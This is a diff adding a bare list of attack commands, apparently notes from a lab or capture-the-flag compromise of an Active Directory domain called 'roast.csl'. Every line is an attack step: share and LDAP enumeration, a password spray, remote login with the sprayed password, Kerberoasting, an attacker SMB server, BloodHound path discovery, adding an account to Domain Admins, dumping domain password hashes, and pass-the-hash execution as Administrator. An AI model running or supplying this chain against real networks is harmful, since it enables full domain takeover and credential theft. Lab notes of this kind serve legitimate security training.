@@ -1,0 +1,30 @@
+
+smbclient -L 172.31.3.2
+ldapsearch -x -h 172.31.1.4 -s base namingcontexts
+rpcclient 172.31.3.2 -U 'dsmith'
+kerbrute passwordspray -v -d roast.csl --dc 172.31.3.2 users.txt WelcomeToR04st
+
+evil-winrm -i 172.31.3.2 -u crhodes -p 'WelcomeToR04st' -s '/opt/PowerSploit/Recon/'
+GetUserSPNs.py roast.csl/crhodes:WelcomeToR04st -request
+
+#setup impackers smb-server
+
+impacket-smbserver test123 $(pwd) -smb2support -username iamksnoob -password 1234
+
+.\SharpHound.exe
+
+neo4j console start
+
+ROASTSVC@ROAST.CSL --> DOMAIN ADMINS@ROAST.CSL
+
+net group "domain admins"
+
+net group "Domain Admins" roastsvc /ADD /DOMAIN
+
+net group "domain admins"
+
+
+secretdump.py roast.csl/roastsvc@roast.csl -dc-ip 172.31.3.2
+
+psexec.py -hashes "DFGHJKCVBN" roast.csl/Administrator@172.31.3.2
+
